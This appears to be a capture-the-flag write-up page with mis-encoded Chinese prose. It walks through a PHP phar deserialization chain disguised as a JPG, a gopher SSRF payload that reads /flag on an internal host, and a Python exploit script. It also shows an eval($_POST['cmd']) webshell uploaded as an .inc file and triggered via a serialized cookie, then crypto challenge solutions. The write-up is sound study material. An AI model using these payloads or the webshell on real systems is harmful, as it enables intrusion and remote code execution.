<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$schema</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> AdminShow();</span><br><span class="line"><span class="variable">$guest</span> = <span class="keyword">new</span> GuestShow();</span><br><span class="line"><span class="variable">$guest1</span> = <span class="keyword">new</span> GuestShow();</span><br><span class="line"><span class="variable">$upload</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$upload1</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$upload2</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$guest</span>-&gt;file = <span class="variable">$upload</span>;</span><br><span class="line"><span class="variable">$upload</span>-&gt;tmp = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str[<span class="number">0</span>] = <span class="variable">$upload1</span>;</span><br><span class="line"><span class="variable">$upload1</span>-&gt;date=<span class="string">&#x27;&#x27;</span>; <span class="comment">// ç»™sourceèµ‹å€¼</span></span><br><span class="line"><span class="variable">$upload1</span>-&gt;filesize = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;filesize = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;tmp = <span class="variable">$guest1</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str[<span class="number">1</span>] = <span class="variable">$upload2</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;date = <span class="string">&#x27;&#x27;</span>; <span class="comment">// ç»™schemaèµ‹å€¼</span></span><br><span class="line"><span class="variable">$guest1</span>-&gt;file = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$guest</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&#x27;test.phar&#x27;</span>,<span class="string">&#x27;f.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠŠæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶é€šè¿‡showfie.phpè¿›è¡Œphar://åè®®è§¦å‘ååºåˆ—åŒ–ï¼Œæœ€å…ˆæˆ‘ä»¬å¯ä»¥å…ˆè¯»å–<code>/etc/hosts</code>å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.18.0.2	3b35825919ae</span><br><span class="line">10.10.10.5	3b35825919ae</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå…ˆå¯ä»¥åˆ©ç”¨httpåè®®æŸ¥çœ‹é‚£ä¸ªipå­˜åœ¨å¯åˆ©ç”¨ä¿¡æ¯ï¼Œæœ€ç»ˆå‘ç°åœ¨<code>10.10.10.10</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å†…ç½‘èµ„æºé˜…è¯»å™¨-æµ‹è¯•æœº</span></span><br><span class="line"><span class="comment">//é…ç½®ä¿¡æ¯è¯·çœ‹phpinfo.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line">    curl_close(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;10.10.10.101&#x27;</span>||<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;100.100.100.101&#x27;</span>)&#123;</span><br><span class="line">    system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ååˆ©ç”¨gopherè¿›è¡ŒGETåˆ©ç”¨url fileåè®®è¯»å–flagå°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;GET /?url=file:///flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.10.10.101</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://10.10.10.10:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆexpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(filename):</span><br><span class="line">    with open(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        a = base64.b64encode(f.read())</span><br><span class="line">    c = base64.b64encode(base64.b64decode(a).replace(<span class="string">b&quot;10.10.10.5&quot;</span>, <span class="string">b&quot;10.10.10.6&quot;</span>))</span><br><span class="line">    with open(<span class="string">&#x27;e.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">        w.write(base64.b64decode(c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/upload.php&#x27;</span></span><br><span class="line">    <span class="comment"># url = &#x27;http://127.0.0.1:40012/upload.php&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;123456789&#x27;</span>&#125;</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: open(<span class="string">&#x27;f.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(url, files=files, data=data, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;test2&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def phar(payload):</span><br><span class="line">    <span class="comment"># url = &#x27;http://47.104.95.124:8080/showfile.php?f=&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=php://filter/guest/resource=phar:///var/www/html/&#x27;</span></span><br><span class="line">    <span class="comment"># url = &#x27;http://127.0.0.1:40012/showfile.php?f=php://filter/guest/resource=phar://&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(upload())</span></span><br><span class="line">    <span class="comment"># payload = &#x27;phar:///var/www/html/&#x27; + upload()</span></span><br><span class="line">    <span class="comment"># data = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;111111111&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># files = &#123;&#x27;file&#x27;: &#x27;123&#x27;&#125;</span></span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getFileByGuestShow():</span><br><span class="line">    <span class="keyword">global</span> content</span><br><span class="line">    filename = [<span class="string">&#x27;index.php&#x27;</span>, <span class="string">&#x27;showfile.php&#x27;</span>, <span class="string">&#x27;class.php&#x27;</span>, <span class="string">&#x27;upload.php&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> file in filename:</span><br><span class="line">        url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=demo/../&#x27;</span> + file</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        zz = re.compile(<span class="string">&#x27;&lt;img src=data:jpg;base64,[a-zA-Z0-9\\\+/=]&#123;1,&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> zz.findall(r.text):</span><br><span class="line">            content = zz.findall(r.text)[<span class="number">0</span>][<span class="number">25</span>:]</span><br><span class="line">            <span class="keyword">print</span>(content)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            with open(file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">                base = base64.b64decode(content)</span><br><span class="line">                <span class="keyword">print</span>(base)</span><br><span class="line">                w.write(base)</span><br><span class="line">        except:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getFileByAdminShow():</span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;111111111&#x27;</span>&#125;</span><br><span class="line">    payload = <span class="string">&#x27;../../../../etc/hosts&#x27;</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url + payload, files=files, data=data, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;test123456&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># edit(&#x27;e.jpg&#x27;)</span></span><br><span class="line">    upload()</span><br><span class="line">    <span class="comment"># getFileByGuestShow()  # è·å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">    phar(<span class="string">&#x27;16029c2703ba2ab39d897f966a28f95c/f.jpg&#x27;</span>)  <span class="comment"># ä¸Šä¼ æ–‡ä»¶å¹¶æ‰§è¡Œphar</span></span><br><span class="line">    <span class="comment"># getFileByAdminShow()</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2e340a68ab1b444fbacace5443fec797.png" alt="QQå›¾ç‰‡20220801142401"></p>
<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;easy_penetration_it_is_!_QAQ&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¼ºç½‘å…ˆé”‹"><a href="#å¼ºç½‘å…ˆé”‹" class="headerlink" title="å¼ºç½‘å…ˆé”‹"></a>å¼ºç½‘å…ˆé”‹</h3><h4 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h4><p>å­˜åœ¨<code>www.zip</code>æ³„éœ²</p>
<p>upload.phpä¸­å­˜åœ¨é»‘åå•ï¼Œå¹¶ä¸”å°è¯•ä¸Šä¼ phpsç­‰åç¼€çš„æ—¶å€™å‘ç°å¹¶æ²¡æœ‰è¢«è§£æï¼Œä½†æ˜¯å¯ä»¥ä¸Šä¼ incæ–‡ä»¶</p>
<p>å¹¶ä¸”å¯ä»¥å‘ç°æ–‡ä»¶åä¼šè¢«æ”¾åˆ°<code>$userfile</code>æ•°ç»„ä¸­å¹¶å°†æ•°ç»„åºåˆ—åŒ–æ”¾åˆ°cookieä¸­ï¼Œå½“ç„¶åœ¨ä¸€å¼€å§‹åšé¢˜æµ‹è¯•çš„æ—¶å€™åº”è¯¥ä¹Ÿèƒ½ä»é¡µé¢ä¸­çœ‹åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeArr</span> = explode(<span class="string">&quot;/&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>]);</span><br><span class="line">        <span class="variable">$imgType</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$typeArr</span>[<span class="number">0</span>]== <span class="string">&quot;image&quot;</span> | !in_array(<span class="variable">$typeArr</span>[<span class="number">1</span>], <span class="variable">$imgType</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>];</span><br><span class="line">        <span class="variable">$filearray</span> = pathinfo(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$filearray</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;extension error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$imgname</span> = md5(time()).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;./&quot;</span>.<span class="variable">$imgname</span>)) &#123;</span><br><span class="line">            array_push(<span class="variable">$userfile</span>, <span class="variable">$imgname</span>);</span><br><span class="line">            setcookie(<span class="string">&quot;userfile&quot;</span>, serialize(<span class="variable">$userfile</span>), time() + <span class="number">3600</span>*<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$msg</span> = e(<span class="string">&quot;file: <span class="subst">&#123;$imgname&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨class.inc.phpä¸­å¯ä»¥å‘ç°ï¼Œè€Œå®ƒä¸ä»…å¯ä»¥è§£æphpæ–‡ä»¶è¿˜å¯ä»¥è§£æincæ–‡ä»¶</p>
<p>è€Œè¿™é‡Œä¹Ÿç›´æ¥å¯¹cookieè¿›è¡Œååºåˆ—åŒ–ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">spl_autoload_register();</span><br><span class="line"><span class="variable">$userfile</span> = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]) ? [] : unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç›´æ¥ä¸Šä¼ ä¸€ä¸ªincæ–‡ä»¶ï¼Œæ³¨æ„è¦å°†æ–‡ä»¶çš„Content-typeä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b5891132765242fd9daff83805a9f76e.png" alt="image-20220801135545948"></p>
<p>è·å¾—æ–‡ä»¶åï¼Œå°†cookieä¿®æ”¹æˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A32%3A%2202f9bf508f93eebdd216dba17c5a99c0%22%3A0%3A%7B%7D</span><br></pre></td></tr></table></figure>

<p>åˆ·æ–°ä¸€ä¸‹ï¼Œæ‰§è¡ŒæˆåŠŸ</p>
<p><img src="https://img-blog.csdnimg.cn/dd15e841bf46482c88ec479bf68a682c.png" alt="image-20220801140011233"></p>
<p>flagï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3acd895a-8b80-4fd7-8cc9-2701f261d654&#125;</span><br></pre></td></tr></table></figure>

<h4 id="polydiv"><a href="#polydiv" class="headerlink" title="polydiv"></a>polydiv</h4><ul>
<li><p>é¢˜ç›®æè¿°</p>
<p>å¤šé¡¹å¼ä¹˜æ³•ï¼Œå·²çŸ¥<code>a(x)*b(x)+c(x)=r(x)</code>ï¼Œ<code>a(x),c(x),r(x)</code>æ±‚`b(x)</p>
</li>
</ul>
<p>é¢˜ç›®ä¸æä¾›çš„ä»£ç ç¨æœ‰å‡ºå…¥ï¼ŒæœåŠ¡å™¨ä¸Šè·‘çš„æ˜¯å¯ä»¥çœ‹æˆåœ¨$GF(2^8)$ä¸‹æ±‚<code>b(x)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sage: R.&lt;x&gt;=GF(<span class="number">8</span>)</span><br><span class="line">sage: a = x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">2</span></span><br><span class="line">....: c = x^<span class="number">6</span> + x^<span class="number">5</span> + x^<span class="number">4</span> + x^<span class="number">3</span> + x^<span class="number">2</span> + x + <span class="number">1</span></span><br><span class="line">....: r = x^<span class="number">14</span> + x^<span class="number">12</span> + x^<span class="number">10</span> + x^<span class="number">7</span> + x^<span class="number">2</span> + x + <span class="number">1</span></span><br><span class="line">sage: (r-c)/a</span><br><span class="line">x^<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç›´æ¥çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> poly2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">table = ascii_letters + digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;182.92.82.77&#x27;</span>, <span class="number">12469</span>)</span><br><span class="line">        self.r = <span class="number">0</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line">        self.c = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        proof = self.sh.recvuntil(<span class="string">b&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">        _<span class="built_in">hash</span> = proof[<span class="number">33</span>:<span class="number">97</span>].decode()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">            head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">            t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">                self.sh.sendline(head.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Poly2N</span>(<span class="params">self, f</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(f.replace(<span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;**&#x27;</span>).replace(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;2&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, a, c, pr</span>):</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            pa, pb, pc = [PP(<span class="built_in">bin</span>(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c]]</span><br><span class="line">            r = pa * pb + pc</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(r) == pr:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">int</span>(b)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve_rac</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;r(x) = &#x27;</span>)</span><br><span class="line">            self.r = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            tmp = self.r</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;a(x) = &#x27;</span>)</span><br><span class="line">            self.a = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;c(x) = &#x27;</span>)</span><br><span class="line">            self.c = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            self.r = self.Poly2N(self.r)</span><br><span class="line">            self.a = self.Poly2N(self.a)</span><br><span class="line">            self.c = self.Poly2N(self.c)</span><br><span class="line">            b = self.check(self.a, self.c, tmp)</span><br><span class="line">            <span class="keyword">if</span> b:</span><br><span class="line">                self.sh.sendlineafter(<span class="string">b&#x27;&gt; b(x) = &#x27;</span>, <span class="built_in">str</span>(PP(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])).encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.solve_rac()</span><br><span class="line">        self.sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br><span class="line"><span class="comment"># flag&#123;f2887f56-0114-49c0-a0c6-663f164ef84a&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h4><ul>
<li><p>é¢˜ç›®æè¿°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> falg</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> s:s + <span class="built_in">bytes</span>([(<span class="built_in">len</span>(s)-<span class="number">1</span>)%<span class="number">16</span>+<span class="number">1</span>]*((<span class="built_in">len</span>(s)-<span class="number">1</span>)%<span class="number">16</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">n = getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">flag = pad(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) &gt;= <span class="number">48</span>)</span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line"><span class="string">e = 3</span></span><br><span class="line"><span class="string">c = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
